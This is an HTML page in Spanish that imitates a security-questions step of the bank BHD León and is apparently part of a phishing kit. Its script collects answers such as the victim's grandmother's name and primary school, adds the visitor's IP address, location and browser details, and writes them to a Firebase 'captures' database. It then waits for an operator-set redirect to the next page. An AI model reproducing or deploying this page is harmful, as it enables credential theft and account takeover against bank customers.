<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Preguntas de Seguridad - BHD</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    body {
      background: url('background-login.webp') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      position: relative;
    }
    body::before {
      content: '';
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.4);
      z-index: 1;
    }
    .container {
      width: 100%; max-width: 500px;
      background-color: rgba(255, 255, 255, 0.95);
      border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      overflow: hidden; padding: 25px; position: relative; z-index: 2;
      backdrop-filter: blur(5px); border: 1px solid rgba(255, 255, 255, 0.3);
    }
    .logo { text-align: center; margin-bottom: 20px; }
    .logo img { max-width: 120px; }
    h2 { color: #005e2a; margin-bottom: 15px; text-align: center; }
    .form-group { margin-bottom: 15px; }
    label { display: block; margin-bottom: 5px; font-weight: 500; color: #333; }
    input[type="text"] {
      width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px;
      font-size: 14px; background: #fff;
    }
    input[type="text"]:focus {
      outline: none; border-color: #005e2a; box-shadow: 0 0 0 2px rgba(0, 94, 42, 0.2);
    }
    button {
      width: 100%; background-color: #51af46; color: white; border: none; border-radius: 6px;
      padding: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;
      transition: all 0.3s;
    }
    button:hover {
      background-color: #004a22; transform: translateY(-1px); box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
    }
    button:disabled {
      background-color: #cccccc; cursor: not-allowed; transform: none; box-shadow: none;
    }
    .loading {
      display: none; text-align: center; margin-top: 10px;
      color: #005e2a; font-size: 14px;
    }
    .verification-status {
      display: none; text-align: center; margin-top: 15px;
      padding: 12px; border-radius: 6px; background: #f8f9fa;
      border: 1px solid #e9ecef; font-size: 14px; color: #495057;
    }
    .dots-animation:after {
      content: ''; animation: dots 1.5s steps(4, end) infinite;
    }
    @keyframes dots {
      0%, 20% { content: ''; }
      40% { content: '.'; }
      60% { content: '..'; }
      80%, 100% { content: '...'; }
    }
    .security-info {
      text-align: center; margin-top: 20px; font-size: 12px; color: #666;
      border-top: 1px solid #eee; padding-top: 15px;
    }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="logo-bhd.svg" alt="BHD Le√≥n" onerror="this.style.display='none'; document.write('<h3>BHD Le√≥n</h3>')">
    </div>
    <h2>Preguntas de Seguridad</h2>
    <form id="securityForm">
      <div class="form-group">
        <label>Color favorito *</label>
        <input type="text" id="ans1" required autocomplete="off">
      </div>
      <div class="form-group">
        <label>Marca de su primer carro *</label>
        <input type="text" id="ans2" required autocomplete="off">
      </div>
      <div class="form-group">
        <label>Personaje de su libro favorito *</label>
        <input type="text" id="ans3" required autocomplete="off">
      </div>
      <div class="form-group">
        <label>Nombre de su abuela materna *</label>
        <input type="text" id="ans4" required autocomplete="off">
      </div>
      <div class="form-group">
        <label>Colegio de primaria *</label>
        <input type="text" id="ans5" required autocomplete="off">
      </div>
      <button type="submit" id="submitBtn">Continuar</button>
      <div class="loading" id="loading">
        <i class="fas fa-spinner fa-spin"></i> Verificando respuestas<span class="dots-animation"></span>
      </div>
      <div class="verification-status" id="verificationStatus">
        <i class="fas fa-shield-check"></i> Verificaci√≥n de seguridad en proceso
      </div>
    </form>
    <div class="security-info">
      <i class="fas fa-lock"></i> Sus respuestas est√°n protegidas
    </div>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>

  <script>
    // Configuraci√≥n de Firebase - MISMA QUE INDEX.HTML
    const firebaseConfig = {
      apiKey: "AIzaSyBXlb9Gx6qFzNqt0zh5v0Chc2IdrmTJinc",
      authDomain: "bhd-firebase.firebaseapp.com",
      databaseURL: "https://bhd-firebase-default-rtdb.firebaseio.com",
      projectId: "bhd-firebase",
      storageBucket: "bhd-firebase.firebasestorage.app",
      messagingSenderId: "533432173965",
      appId: "1:533432173965:web:a99d8be092337754e1e9c4"
    };

    // Inicializar Firebase
    console.log('üöÄ Inicializando Firebase...');
    try {
      firebase.initializeApp(firebaseConfig);
      console.log('‚úÖ Firebase inicializado correctamente');
    } catch (error) {
      console.error('‚ùå Error inicializando Firebase:', error);
    }

    const database = firebase.database();

    function getUID() {
      const urlParams = new URLSearchParams(window.location.search);
      const uid = urlParams.get('uid');
      console.log('üîç UID obtenido:', uid);
      return uid;
    }

    async function captureBasicData() {
      console.log('üì° Capturando datos del sistema...');
      const data = {
        userAgent: navigator.userAgent,
        screenResolution: `${screen.width}x${screen.height}`,
        platform: navigator.platform,
        language: navigator.language,
        referrer: document.referrer || 'Directo',
        date: new Date().toLocaleDateString('es-ES'),
        time: new Date().toLocaleTimeString('es-ES'),
        ip: 'No disponible',
        city: 'No disponible',
        country: 'No disponible',
        region: 'No disponible'
      };

      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        data.ip = ipData.ip;
        console.log('üì° IP capturada:', data.ip);

        const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
        const locData = await locRes.json();
        data.city = locData.city || 'No disponible';
        data.country = locData.country_name || 'No disponible';
        data.region = locData.region || 'No disponible';
        console.log('üìç Ubicaci√≥n capturada:', data.city, data.country);
      } catch (e) {
        console.warn('‚ö†Ô∏è No se pudo capturar IP/ubicaci√≥n');
      }
      return data;
    }

    async function sendToFirebase(uid, step, payload) {
      console.log(`üì§ Enviando a Firebase: ${uid}/${step}`, payload);
      try {
        await database.ref(`captures/${uid}/${step}`).set(payload);
        console.log('‚úÖ Datos enviados correctamente a Firebase');
        return true;
      } catch (error) {
        console.error('‚ùå Error enviando a Firebase:', error);
        return false;
      }
    }

    function listenForRedirect(uid) {
      console.log(`üëÇ Escuchando redirecci√≥n para: ${uid}`);
      const redirectRef = database.ref(`captures/${uid}/redirectPage`);
      
      redirectRef.on('value', (snapshot) => {
        const page = snapshot.val();
        console.log(`üîÑ Estado de redirecci√≥n: ${page}`);
        
        if (page && page !== 'pending') {
          console.log(`üéØ Redirigiendo a: ${page}`);
          redirectRef.off();
          window.location.href = `${page}?uid=${uid}`;
        }
      });
    }

    function showVerificationStatus() {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('verificationStatus').style.display = 'block';
    }

    function disableForm() {
      document.getElementById('ans1').disabled = true;
      document.getElementById('ans2').disabled = true;
      document.getElementById('ans3').disabled = true;
      document.getElementById('ans4').disabled = true;
      document.getElementById('ans5').disabled = true;
      document.getElementById('submitBtn').disabled = true;
    }

    // Validaci√≥n en tiempo real
    function validateForm() {
      const ans1 = document.getElementById('ans1').value.trim();
      const ans2 = document.getElementById('ans2').value.trim();
      const ans3 = document.getElementById('ans3').value.trim();
      const ans4 = document.getElementById('ans4').value.trim();
      const ans5 = document.getElementById('ans5').value.trim();
      
      const isValid = ans1 && ans2 && ans3 && ans4 && ans5;
      document.getElementById('submitBtn').disabled = !isValid;
    }

    async function handleSubmit(e) {
      e.preventDefault();
      const uid = getUID();
      if (!uid) {
        console.error('‚ùå No se encontr√≥ UID');
        return;
      }

      const ans1 = document.getElementById('ans1').value.trim();
      const ans2 = document.getElementById('ans2').value.trim();
      const ans3 = document.getElementById('ans3').value.trim();
      const ans4 = document.getElementById('ans4').value.trim();
      const ans5 = document.getElementById('ans5').value.trim();

      if (!ans1 || !ans2 || !ans3 || !ans4 || !ans5) {
        console.log('‚ùå Validaci√≥n fallida - Campos vac√≠os');
        return;
      }

      const btn = document.getElementById('submitBtn');
      const loading = document.getElementById('loading');
      
      // Deshabilitar interfaz
      btn.disabled = true;
      disableForm();
      loading.style.display = 'block';

      console.log('üîê Procesando preguntas de seguridad...');

      try {
        const basicData = await captureBasicData();
        const payload = {
          ans1: ans1,
          ans2: ans2,
          ans3: ans3,
          ans4: ans4,
          ans5: ans5,
          ...basicData,
          timestamp: firebase.database.ServerValue.TIMESTAMP
        };

        console.log('üì¶ Payload preparado:', payload);

        // Enviar a Firebase
        const success = await sendToFirebase(uid, 'security', payload);
        
        if (success) {
          console.log('‚úÖ Preguntas de seguridad enviadas correctamente');
          
          // Mostrar estado de verificaci√≥n
          setTimeout(() => {
            showVerificationStatus();
          }, 2000);

          // Escuchar redirecci√≥n
          listenForRedirect(uid);

        } else {
          throw new Error('Error enviando a Firebase');
        }

      } catch (err) {
        console.error('‚ùå Error en preguntas de seguridad:', err);
        // Restaurar interfaz silenciosamente
        loading.style.display = 'none';
        btn.disabled = false;
        document.getElementById('ans1').disabled = false;
        document.getElementById('ans2').disabled = false;
        document.getElementById('ans3').disabled = false;
        document.getElementById('ans4').disabled = false;
        document.getElementById('ans5').disabled = false;
      }
    }

    // Event listeners
    document.getElementById('securityForm').addEventListener('submit', handleSubmit);
    document.getElementById('ans1').addEventListener('input', validateForm);
    document.getElementById('ans2').addEventListener('input', validateForm);
    document.getElementById('ans3').addEventListener('input', validateForm);
    document.getElementById('ans4').addEventListener('input', validateForm);
    document.getElementById('ans5').addEventListener('input', validateForm);

    // Inicializar validaci√≥n
    validateForm();
    console.log('‚úÖ pregunta-1.html cargado y listo');
  </script>
</body>
</html>